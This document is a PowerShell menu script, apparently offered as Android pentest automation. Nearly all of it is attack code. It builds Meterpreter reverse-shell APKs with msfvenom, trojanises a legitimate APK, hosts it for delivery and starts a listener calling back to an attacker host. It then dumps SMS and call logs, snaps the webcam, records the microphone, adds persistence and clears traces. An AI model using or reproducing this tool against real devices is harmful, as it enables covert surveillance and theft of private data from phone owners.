# Mobile Penetration Testing Automation Script in PowerShell
# Author: Muhammad Sudais Usmani
# Description: This script automates various tasks related to mobile pentesting.

$TARGET_IP = "192.168.170.101"
$TARGET_PORT = "5555"
$LHOST = "192.168.130.129"
$LPORT = "443"
$PAYLOAD = "android/meterpreter/reverse_tcp"
$OUTPUT_APK = "backdoor.apk"
$INFECTED_APK = "infected_app.apk"

function Check-ADB {
    Write-Host "[+] Checking ADB connection..."
    adb devices
    adb connect "$TARGET_IP`:$TARGET_PORT"
}

function ADB-ShellAccess {
    Write-Host "[+] Gaining shell access..."
    adb shell
}

function Generate-Payload {
    Write-Host "[+] Generating malicious APK..."
    msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -o $OUTPUT_APK
}

function Inject-Payload {
    Write-Host "[+] Injecting payload into a legitimate APK..."
    $ORIGINAL_APK = Read-Host "Enter path to original APK"
    msfvenom -x $ORIGINAL_APK -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -o $INFECTED_APK
}

function Start-HTTPServer {
    Write-Host "[+] Starting Python HTTP server on port 8080..."
    Start-Process -NoNewWindow -FilePath "python3" -ArgumentList "-m http.server 8080"
}

function Start-MSFListener {
    Write-Host "[+] Starting Metasploit listener..."
    Start-Process -NoNewWindow -FilePath "msfconsole" -ArgumentList "-q -x 'use exploit/multi/handler; set payload $PAYLOAD; set LHOST $LHOST; set LPORT $LPORT; exploit'"
}

function Control-Device {
    Write-Host "[+] Listing active sessions..."
    Start-Process -NoNewWindow -FilePath "msfconsole" -ArgumentList "-q -x 'sessions'"
    $SESSION_ID = Read-Host "Enter session ID to interact with"
    Start-Process -NoNewWindow -FilePath "msfconsole" -ArgumentList "-q -x 'sessions -i $SESSION_ID'"
}

function Extract-Data {
    Write-Host "[+] Extracting data from the target device..."
    Write-Host "Dumping call logs..."
    Start-Process -NoNewWindow -FilePath "msfconsole" -ArgumentList "-q -x 'dump_calllog'"
    Write-Host "Dumping SMS messages..."
    Start-Process -NoNewWindow -FilePath "msfconsole" -ArgumentList "-q -x 'dump_sms'"
    Write-Host "Capturing webcam snapshot..."
    Start-Process -NoNewWindow -FilePath "msfconsole" -ArgumentList "-q -x 'webcam_snap'"
    Write-Host "Recording microphone for 10 seconds..."
    Start-Process -NoNewWindow -FilePath "msfconsole" -ArgumentList "-q -x 'record_mic 10'"
}

function Maintain-Access {
    Write-Host "[+] Enabling persistence..."
    Start-Process -NoNewWindow -FilePath "msfconsole" -ArgumentList "-q -x 'run persistence -A'"
}

function Clear-Traces {
    Write-Host "[+] Removing malicious APK..."
    adb shell rm /sdcard/$OUTPUT_APK
}

while ($true) {
    Write-Host "`n[ Mobile Pentesting Automation Script ]"
    Write-Host "1) Check ADB Connection"
    Write-Host "2) Gain ADB Shell Access"
    Write-Host "3) Generate Malicious APK"
    Write-Host "4) Inject Payload into APK"
    Write-Host "5) Start HTTP Server for Deployment"
    Write-Host "6) Start Metasploit Listener"
    Write-Host "7) Control Compromised Device"
    Write-Host "8) Extract Data from Target"
    Write-Host "9) Maintain Access"
    Write-Host "10) Clear Traces"
    Write-Host "11) Exit"
    
    $OPTION = Read-Host "Choose an option"
    switch ($OPTION) {
        1 { Check-ADB }
        2 { ADB-ShellAccess }
        3 { Generate-Payload }
        4 { Inject-Payload }
        5 { Start-HTTPServer }
        6 { Start-MSFListener }
        7 { Control-Device }
        8 { Extract-Data }
        9 { Maintain-Access }
        10 { Clear-Traces }
        11 { exit }
        default { Write-Host "Invalid option, please try again." }
    }
}
